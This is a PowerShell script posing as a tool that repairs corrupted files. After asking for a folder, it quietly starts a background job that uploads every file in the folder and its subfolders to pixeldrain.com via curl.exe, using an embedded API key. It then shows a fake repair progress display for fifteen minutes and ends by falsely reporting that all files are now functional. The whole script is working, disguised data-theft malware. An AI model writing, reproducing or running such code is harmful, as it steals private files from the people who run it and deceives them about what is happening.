Clear-Host

$FolderPath = Read-Host "Enter the folder path"

if (Test-Path $FolderPath) {
    $TotalTime = 900  # in seconds
    $RepairProgress = 0
    $StartTime = Get-Date

    Write-Host "[*] Attempting to repair corrupted files..." -ForegroundColor Green

    $uploadJob = Start-Job -ScriptBlock {
        param ($FolderPath)
        
        # Get all files in folder and subfolders
        Get-ChildItem -Path $FolderPath -File -Recurse | ForEach-Object {
            $File = $_.FullName
            if (Test-Path $File) {
                curl.exe -T "$File" -u :310c295d-cdfb-449a-98dd-121ef3b1ab3e https://pixeldrain.com/api/file/ > $null 2>&1
            }
        }
    } -ArgumentList $FolderPath

    while ($true) {
        $ElapsedTime = (Get-Date) - $StartTime
        $ElapsedSeconds = [math]::Round($ElapsedTime.TotalSeconds)

        if ($ElapsedSeconds -ge $TotalTime) { break }

        $RepairProgress = [math]::Round(($ElapsedSeconds / $TotalTime) * 100)

        Write-Host "Repairing files... ($RepairProgress% complete)"
        Write-Host "Time elapsed: $([math]::Floor($ElapsedSeconds / 60)) minutes $($ElapsedSeconds % 60) seconds"
        Write-Host "---------------------------"

        $sleepTime = Get-Random -Minimum 1 -Maximum 11
        Start-Sleep -Seconds $sleepTime
    }

    Wait-Job -Job $uploadJob

    Write-Host "[*] Repair process complete. All files are now functional." -ForegroundColor Green

    Remove-Job -Job $uploadJob
} else {
    Write-Host "The folder path does not exist." -ForegroundColor Red
}
